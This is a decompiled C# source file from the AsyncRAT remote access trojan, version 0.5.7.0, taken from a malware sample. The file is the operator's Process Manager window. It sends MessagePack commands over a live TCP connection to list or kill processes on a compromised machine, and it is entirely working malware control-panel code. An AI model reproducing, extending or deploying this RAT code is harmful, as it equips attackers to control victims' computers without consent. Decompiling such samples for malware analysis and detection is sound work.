// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormProcessManager
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
  public class FormProcessManager : Form
  {
    private IContainer components;
    private ColumnHeader lv_name;
    private ColumnHeader lv_id;
    public ListView listView1;
    public ImageList imageList1;
    private ContextMenuStrip contextMenuStrip1;
    private ToolStripMenuItem killToolStripMenuItem;
    private ToolStripMenuItem refreshToolStripMenuItem;
    public System.Windows.Forms.Timer timer1;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    internal Clients ParentClient { get; set; }

    public FormProcessManager() => this.InitializeComponent();

    private void timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.Client.TcpClient.Connected && this.ParentClient.TcpClient.Connected)
          return;
        this.Close();
      }
      catch
      {
        this.Close();
      }
    }

    private async void killToolStripMenuItem_Click(object sender, EventArgs e)
    {
      FormProcessManager formProcessManager1 = this;
      if (formProcessManager1.listView1.SelectedItems.Count <= 0)
        return;
      foreach (ListViewItem selectedItem in formProcessManager1.listView1.SelectedItems)
      {
        FormProcessManager formProcessManager = formProcessManager1;
        ListViewItem P = selectedItem;
        await Task.Run((Action) (() =>
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "processManager";
          msgPack.ForcePathObject("Option").AsString = "Kill";
          msgPack.ForcePathObject("ID").AsString = P.SubItems[formProcessManager.lv_id.Index].Text;
          ThreadPool.QueueUserWorkItem(new WaitCallback(formProcessManager.Client.Send), (object) msgPack.Encode2Bytes());
        }));
      }
    }

    private void refreshToolStripMenuItem_Click(object sender, EventArgs e) => ThreadPool.QueueUserWorkItem((WaitCallback) (o =>
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "processManager";
      msgPack.ForcePathObject("Option").AsString = "List";
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
    }));

    private void FormProcessManager_FormClosed(object sender, FormClosedEventArgs e)
    {
      try
      {
        ThreadPool.QueueUserWorkItem((WaitCallback) (o => this.Client?.Disconnected()));
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormProcessManager));
      this.listView1 = new ListView();
      this.lv_name = new ColumnHeader();
      this.lv_id = new ColumnHeader();
      this.contextMenuStrip1 = new ContextMenuStrip(this.components);
      this.killToolStripMenuItem = new ToolStripMenuItem();
      this.refreshToolStripMenuItem = new ToolStripMenuItem();
      this.imageList1 = new ImageList(this.components);
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.contextMenuStrip1.SuspendLayout();
      this.SuspendLayout();
      this.listView1.BorderStyle = BorderStyle.None;
      this.listView1.Columns.AddRange(new ColumnHeader[2]
      {
        this.lv_name,
        this.lv_id
      });
      this.listView1.ContextMenuStrip = this.contextMenuStrip1;
      this.listView1.Dock = DockStyle.Fill;
      this.listView1.Enabled = false;
      this.listView1.FullRowSelect = true;
      this.listView1.GridLines = true;
      this.listView1.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.listView1.HideSelection = false;
      this.listView1.Location = new Point(0, 0);
      this.listView1.Name = "listView1";
      this.listView1.ShowGroups = false;
      this.listView1.ShowItemToolTips = true;
      this.listView1.Size = new Size(500, 577);
      this.listView1.SmallImageList = this.imageList1;
      this.listView1.Sorting = SortOrder.Ascending;
      this.listView1.TabIndex = 0;
      this.listView1.UseCompatibleStateImageBehavior = false;
      this.listView1.View = View.Details;
      this.lv_name.Text = "Name";
      this.lv_name.Width = 281;
      this.lv_id.Text = "ID";
      this.lv_id.Width = 150;
      this.contextMenuStrip1.ImageScalingSize = new Size(24, 24);
      this.contextMenuStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.killToolStripMenuItem,
        (ToolStripItem) this.refreshToolStripMenuItem
      });
      this.contextMenuStrip1.Name = "contextMenuStrip1";
      this.contextMenuStrip1.Size = new Size(144, 68);
      this.killToolStripMenuItem.Name = "killToolStripMenuItem";
      this.killToolStripMenuItem.Size = new Size(143, 32);
      this.killToolStripMenuItem.Text = "Kill";
      this.killToolStripMenuItem.Click += new EventHandler(this.killToolStripMenuItem_Click);
      this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
      this.refreshToolStripMenuItem.Size = new Size(143, 32);
      this.refreshToolStripMenuItem.Text = "Refresh";
      this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
      this.imageList1.ColorDepth = ColorDepth.Depth32Bit;
      this.imageList1.ImageSize = new Size(32, 32);
      this.imageList1.TransparentColor = Color.Transparent;
      this.timer1.Interval = 1000;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(500, 577);
      this.Controls.Add((Control) this.listView1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FormProcessManager);
      this.Text = "ProcessManager";
      this.FormClosed += new FormClosedEventHandler(this.FormProcessManager_FormClosed);
      this.contextMenuStrip1.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
